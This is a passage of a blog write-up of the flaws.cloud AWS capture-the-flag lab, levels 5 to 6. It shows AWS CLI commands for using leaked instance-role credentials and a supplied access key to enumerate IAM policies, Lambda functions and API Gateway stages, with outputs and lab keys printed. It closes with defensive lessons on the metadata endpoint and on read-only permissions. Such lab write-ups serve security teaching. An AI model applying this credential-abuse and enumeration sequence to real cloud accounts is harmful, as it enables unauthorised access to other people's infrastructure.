<span class="c"># aws_session_token = IQoJb3JpZ2luX2VjECMaCXV...45PGHVF05TUZ6AQ==</span>


aws sts get-caller-identity <span class="se">\</span>
    <span class="nt">--profile</span> flaws2
<span class="c"># {</span>
<span class="c">#     "UserId": "AROAI3DXO3QJ4JAWIIQ5S:i-05bef8a081f307783",</span>
<span class="c">#     "Account": "975426262029",</span>
<span class="c">#     "Arn": "arn:aws:sts::975426262029:assumed-role/flaws/i-05bef8a081f307783"</span>
<span class="c"># }</span>
</pre></table></code></div></div><ol><li>list the bucket</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>
aws s3 <span class="nb">ls </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud <span class="se">\</span>
    <span class="nt">--profile</span> flaws2
<span class="c">#                            PRE ddcc78ff/</span>
<span class="c"># 2017-02-26 21:11:07        871 index.html</span>

aws s3 <span class="nb">ls </span>s3://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/ <span class="se">\</span>
    <span class="nt">--profile</span> flaws2
<span class="c"># 2017-03-02 23:36:23       2463 hint1.html</span>
<span class="c"># 2017-03-02 23:36:23       2080 hint2.html</span>
<span class="c"># 2020-05-22 14:42:20       2924 index.html</span>
</pre></table></code></div></div><hr /><h2 id="lesson-learned-4">Lesson learned</h2><p><code class="language-plaintext highlighter-rouge">169.254.169.254</code>, magic IP in the cloud world.</p><ul><li>AWS, Azure, Google, DigitalOcean and others use this to allow cloud resources to find out metadata about themselves.<li>Some, such as Google, have additional constraints on the requests, such as requiring it to use <code class="language-plaintext highlighter-rouge">Metadata-Flavor: Google</code> as an HTTP header and refusing requests with an <code class="language-plaintext highlighter-rouge">X-Forwarded-For</code> header.<li>AWS has recently created a new IMDSv2 that requires special headers, a challenge and response, and other protections, but many AWS accounts may not have enforced it. If you can make any sort of HTTP request from an EC2 to that IP, you’ll likely get back information the owner would prefer you not see.<li>A similar problem to getting access to the IAM profile’s access keys is access to the EC2’s user-data, which people sometimes use to pass secrets to the EC2 such as API keys or credentials.</ul><p>Avoiding this mistake</p><ul><li>Ensure your applications do not allow access to 169.254.169.254 or any local and private IP ranges.<li>ensure that IAM roles are restricted as much as possible.</ul><hr /><h2 id="level-6---enumerate-the-policy">Level 6 - enumerate the policy</h2><blockquote><p>http://level6-cc4c404a8a8b876167f5e70a7d8c9880.flaws.cloud/ddcc78ff/</p></blockquote><font color="red"> For this final challenge, you're getting a user access key that has the SecurityAudit policy attached to it. See what else it can do and what else you might find in this AWS account. Access key ID: AKIAJFQ6E7BY57Q3OBGA Secret: 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 </font><ol><li>find out who you are</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="c"># looking at IAM policies, get the user name</span>
aws iam get-user <span class="nt">--profile</span> flaws6
<span class="c"># {</span>
<span class="c">#     "User": {</span>
<span class="c">#         "Path": "/",</span>
<span class="c">#         "UserName": "Level6",</span>
<span class="c">#         "UserId": "AIDAIRMDOSCWGLCDWOG6A",</span>
<span class="c">#         "Arn": "arn:aws:iam::975426262029:user/Level6",</span>
<span class="c">#         "CreateDate": "2017-02-26T23:11:16+00:00"</span>
<span class="c">#     }</span>
<span class="c"># }</span>



<span class="c"># what policies are attached to this UserName</span>
aws iam list-attached-user-policies <span class="se">\</span>
    <span class="nt">--user-name</span> Level6 <span class="se">\</span>
    <span class="nt">--profile</span> flaws6
<span class="c"># {</span>
<span class="c">#     "AttachedPolicies": [</span>
<span class="c">#         {</span>
<span class="c">#             "PolicyName": "list_apigateways",</span>
<span class="c">#             "PolicyArn": "arn:aws:iam::975426262029:policy/list_apigateways"</span>
<span class="c">#         },</span>
<span class="c">#         {</span>
<span class="c">#             "PolicyName": "MySecurityAudit",</span>
<span class="c">#             "PolicyArn": "arn:aws:iam::975426262029:policy/MySecurityAudit"</span>
<span class="c">#         }</span>
<span class="c">#     ]</span>
<span class="c"># }</span>
</pre></table></code></div></div><ol><li>check the <code class="language-plaintext highlighter-rouge">list_apigateways</code> policy</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre><span class="c"># know the PolicyArn, get it's version id:</span>
aws iam get-policy  <span class="se">\</span>
    <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways <span class="se">\</span>
    <span class="nt">--profile</span> flaws6
<span class="c"># {</span>
<span class="c">#     "Policy": {</span>
<span class="c">#         "PolicyName": "list_apigateways",</span>
<span class="c">#         "PolicyId": "ANPAIRLWTQMGKCSPGTAIO",</span>
<span class="c">#         "Arn": "arn:aws:iam::975426262029:policy/list_apigateways",</span>
<span class="c">#         "Path": "/",</span>
<span class="c">#         "DefaultVersionId": "v4",</span>
<span class="c">#         "AttachmentCount": 1,</span>
<span class="c">#         "PermissionsBoundaryUsageCount": 0,</span>
<span class="c">#         "IsAttachable": true,</span>
<span class="c">#         "Description": "List apigateways",</span>
<span class="c">#         "CreateDate": "2017-02-20T01:45:17+00:00",</span>
<span class="c">#         "UpdateDate": "2017-02-20T01:48:17+00:00"</span>
<span class="c">#     }</span>
<span class="c"># }</span>


<span class="c"># Now that you have the ARN and the version id, you can see what the actual policy is:</span>
aws iam get-policy-version  <span class="se">\</span>
    <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/list_apigateways <span class="se">\</span>
    <span class="nt">--version-id</span> v4 <span class="se">\</span>
    <span class="nt">--profile</span> flaws6
<span class="c"># {</span>
<span class="c">#     "PolicyVersion": {</span>
<span class="c">#         "Document": {</span>
<span class="c">#             "Version": "2012-10-17",</span>
<span class="c">#             "Statement": [</span>
<span class="c">#                 {</span>
<span class="c">#                     "Action": [ "apigateway:GET" ],</span>
<span class="c">#                     "Effect": "Allow",</span>
<span class="c">#                     "Resource": "arn:aws:apigateway:us-west-2::/restapis/*"</span>
<span class="c">#                 }</span>
<span class="c">#             ]</span>
<span class="c">#         },</span>
<span class="c">#         "VersionId": "v4",</span>
<span class="c">#         "IsDefaultVersion": true,</span>
<span class="c">#         "CreateDate": "2017-02-20T01:48:17+00:00"</span>
<span class="c">#     }</span>
<span class="c"># }</span>


<span class="c"># The API gateway in this case is used to call a lambda function</span>
</pre></table></code></div></div><ol><li>check the <code class="language-plaintext highlighter-rouge">MySecurityAudit</code> policy</ol><div class="language-bash highlighter-rouge"><div class="code-header" text-data="bash"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
</pre><td class="rouge-code"><pre>aws iam get-policy  <span class="se">\</span>
    <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/MySecurityAudit <span class="se">\</span>
    <span class="nt">--profile</span> flaws6
<span class="c"># "DefaultVersionId": "v1",</span>


aws iam get-policy-version <span class="se">\</span>
    <span class="nt">--policy-arn</span> arn:aws:iam::975426262029:policy/MySecurityAudit <span class="se">\</span>
    <span class="nt">--version-id</span> v1 <span class="se">\</span>
    <span class="nt">--profile</span> flaws6
<span class="c"># {</span>
<span class="c">#     "PolicyVersion": {</span>
<span class="c">#         "Document": {</span>
<span class="c">#             "Version": "2012-10-17",</span>
<span class="c">#             "Statement": [</span>
<span class="c">#                 {</span>
<span class="c">#                     "Action": [</span>
<span class="c">#                         "acm:Describe*",</span>
<span class="c">#                         "acm:List*",</span>
<span class="c">#                         "application-autoscaling:Describe*",</span>
<span class="c">#                         "athena:List*",</span>
<span class="c">#                         "autoscaling:Describe*",</span>
<span class="c">#                         "lambda:GetAccountSettings",</span>
<span class="c">#                         "lambda:GetPolicy",</span>
<span class="c">#                         "lambda:List*",</span>
<span class="c">#                         ...</span>
<span class="c">#                     ] } ] } } }</span>


<span class="c"># The SecurityAudit policy lets you see some things about lambdas:</span>
aws lambda list-functions <span class="se">\</span>
    <span class="nt">--region</span> us-west-2 <span class="se">\</span>
    <span class="nt">--profile</span> flaws6
<span class="c"># {</span>
<span class="c">#     "Functions": [</span>
<span class="c">#         {</span>
<span class="c">#             "FunctionName": "Level6",</span>
<span class="c">#             "FunctionArn": "arn:aws:lambda:us-west-2:975426262029:function:Level6",</span>
<span class="c">#             "Runtime": "python2.7",</span>
<span class="c">#             "Role": "arn:aws:iam::975426262029:role/service-role/Level6",</span>
<span class="c">#             "Handler": "lambda_function.lambda_handler",</span>
<span class="c">#             "CodeSize": 282,</span>
<span class="c">#             "Description": "A starter AWS Lambda function.",</span>
<span class="c">#             "Timeout": 3,</span>
<span class="c">#             "MemorySize": 128,</span>
<span class="c">#             "LastModified": "2017-02-27T00:24:36.054+0000",</span>
<span class="c">#             "CodeSha256": "2iEjBytFbH91PXEMO5R/B9DqOgZ7OG/lqoBNZh5JyFw=",</span>
<span class="c">#             "Version": "$LATEST",</span>
<span class="c">#             "TracingConfig": { "Mode": "PassThrough" },</span>
<span class="c">#             "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b",</span>
<span class="c">#             "PackageType": "Zip"</span>
<span class="c">#         }</span>
<span class="c">#     ]</span>
<span class="c"># }</span>


<span class="c"># the SecurityAudit also lets you run:</span>
aws lambda get-policy <span class="se">\</span>
    <span class="nt">--region</span> us-west-2 <span class="se">\</span>
    <span class="nt">--profile</span> flaws6 <span class="se">\</span>
    <span class="nt">--function-name</span> Level6
<span class="c"># {</span>
<span class="c">#     "Policy": "{\"Version\":\"2012-10-17\",\"Id\":\"default\",\"Statement\":[{\"Sid\":\"904610a93f593b76ad66ed6ed82c0a8b\",\"Effect\":\"Allow\",\"Principal\":{\"Service\":\"apigateway.amazonaws.com\"},\"Action\":\"lambda:InvokeFunction\",\"Resource\":\"arn:aws:lambda:us-west-2:975426262029:function:Level6\",\"Condition\":{\"ArnLike\":{\"AWS:SourceArn\":\"arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\"}}}]}",</span>
<span class="c">#     "RevisionId": "98033dfd-defa-41a8-b820-1f20add9c77b"</span>
<span class="c"># }</span>


<span class="c"># the ability to execute `arn:aws:execute-api:us-west-2:975426262029:s33ppypa75/*/GET/level6\` That "s33ppypa75" is a rest-api-id, which you can then use with that other attached policy:</span>
aws apigateway get-stages <span class="se">\</span>
    <span class="nt">--rest-api-id</span> <span class="s2">"s33ppypa75"</span> <span class="se">\</span>
    <span class="nt">--region</span> us-west-2 <span class="se">\</span>
    <span class="nt">--profile</span> flaws6 <span class="se">\</span>
<span class="c"># {</span>
<span class="c">#     "item": [</span>
<span class="c">#         {</span>
<span class="c">#             "deploymentId": "8gppiv",</span>
<span class="c">#             "stageName": "Prod",</span>
<span class="c">#             "cacheClusterEnabled": false,</span>
<span class="c">#             "cacheClusterStatus": "NOT_AVAILABLE",</span>
<span class="c">#             "methodSettings": {},</span>
<span class="c">#             "tracingEnabled": false,</span>
<span class="c">#             "createdDate": "2017-02-26T19:26:08-05:00",</span>
<span class="c">#             "lastUpdatedDate": "2017-02-26T19:26:08-05:00"</span>
<span class="c">#         }</span>
<span class="c">#     ]</span>
<span class="c"># }</span>

<span class="c"># the stage name is "Prod". Lambda functions are called using that rest-api-id, stage name, region, and resource as https://s33ppypa75.execute-api.us-west-2.amazonaws.com/Prod/level6</span>


<span class="c"># Visit that URL.</span>
<span class="s2">"Go to http://theend-797237e8ada164bf9f12cebf93b282cf.flaws.cloud/d730aa2b/"</span>
</pre></table></code></div></div><h2 id="lesson-learned-5">Lesson learned</h2><p>It is common to give people and entities read-only permissions such as the SecurityAudit policy.</p><ul><li>The ability to read your own and other’s IAM policies can really help an attacker figure out what exists in your environment and look for weaknesses and mistakes. A voiding this mistake<li>Don’t hand out any permissions liberally, even permissions that only let you read meta-data or know what your permissions are.</ul><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/lab/'>Lab</a>, <a href='/categories/ctf/'>CTF</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/lab/" class="post-tag no-text-decoration" >Lab</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >CTF</a> <a href="/tags/flaws/" class="post-tag no-text-decoration" >Flaws</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Lab - CTF：Flaw1.cloud [Level 1 - Level 6] - Grace&url=https://ocholuo.github.io//posts/flaw/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Lab - CTF：Flaw1.cloud [Level 1 - Level 6] - Grace&u=https://ocholuo.github.io//posts/flaw/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Lab - CTF：Flaw1.cloud [Level 1 - Level 6] - Grace&url=https://ocholuo.github.io//posts/flaw/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Amazon-CloudFront/">AWS Lab - AWS CloudFront</a><li><a href="/posts/Alexa-1stSkill/">AWS Alex First Skill - RedVelvet Time</a><li><a href="/posts/NetworkProtocol-SSL-TLS-Handshake/">NetworkProtocol SSL/TLS Handshake</a><li><a href="/posts/pythonCrash/">Python Crash</a><li><a href="/posts/%E4%B8%80%E5%8F%A5%E8%AF%9D%E8%A7%A3%E9%87%8AAWS/">AWS - 一句话解释AWS</a><li><a href="/posts/GKE/">GCP - Google Cloud Computing - Kubernetes and Kubernetes Engine</a><li><a href="/posts/Go-Note/">Go Note</a><li><a href="/posts/SCPs/">AWS - IdenAccessManage - SCPs (Service Control Policies)</a><li><a href="/posts/CompanyBenefit/">Company Benefit</a><li><a href="/posts/Encryption-SSL&TLS/">Cryptography - SSL/TLS Encryption</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/flaw2/"><div class="card-body"> <span class="timeago small" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - CTF：Flaw2.cloud [attacker and defender]</h3><div class="text-muted small"><p> [toc] CTF：Flaw2 Attacker Track Level 1 - sourse code api input error http://level1.flaws2.cloud/ For this level, you'll need to enter the correct PIN code. The correct PIN is 1...</p></div></div></a></div><div class="card"> <a href="/posts/CloudGoat/"><div class="card-body"> <span class="timeago small" >Jan 24, 2021<i class="unloaded">2021-01-24T10:11:11-05:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - CloudGoat [Level 1 - Level 8]</h3><div class="text-muted small"><p> [toc] CloudGoat (☁️🐐) CloudGoat is Rhino Security Labs’ “Vulnerable by Design” AWS deployment tool. CloudGoat is Rhino Security Labs’ “Vulnerable by Design” AWS deployment tool. It al...</p></div></div></a></div><div class="card"> <a href="/posts/cicada3301/"><div class="card-body"> <span class="timeago small" >Apr 2, 2021<i class="unloaded">2021-04-02T11:11:11-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lab - Cicada 3301</h3><div class="text-muted small"><p> [toc] ref Cicada 3301:一只潜伏于互联网深处的“蝉”（一） 蝉3301（2012 PUZZLES）:互联网史上最复杂最神秘最可怕的谜团 Cicada 3301 2012年1月4日 将这张图片用记事本打开，在一堆乱码后面，隐藏着一条讯息： ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/CloudGoat/" class="btn btn-outline-primary" prompt="Older"><p>Lab - CloudGoat [Level 1 - Level 8]</p></a> <a href="/posts/flaw2/" class="btn btn-outline-primary" prompt="Newer"><p>Lab - CTF：Flaw2.cloud [attacker and defender]</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://github.com/ocholuo">Grace JyL</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/aws/">AWS</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/cyberattack/">CyberAttack</a> <a class="post-tag" href="/tags/lab/">Lab</a> <a class="post-tag" href="/tags/cyberattacktools/">CyberAttackTools</a> <a class="post-tag" href="/tags/gcp/">GCP</a> <a class="post-tag" href="/tags/sysadmin/">Sysadmin</a> <a class="post-tag" href="/tags/java/">Java</a> <a class="post-tag" href="/tags/network/">Network</a> <a class="post-tag" href="/tags/soc/">SOC</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://ocholuo.github.io/{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script async src="https://cdn.jsdelivr.net/npm/countup.js@1.9.3/dist/countUp.min.js"></script> <script defer src="/assets/js/dist/pvreport.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-179830187-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-179830187-1'); }); </script>
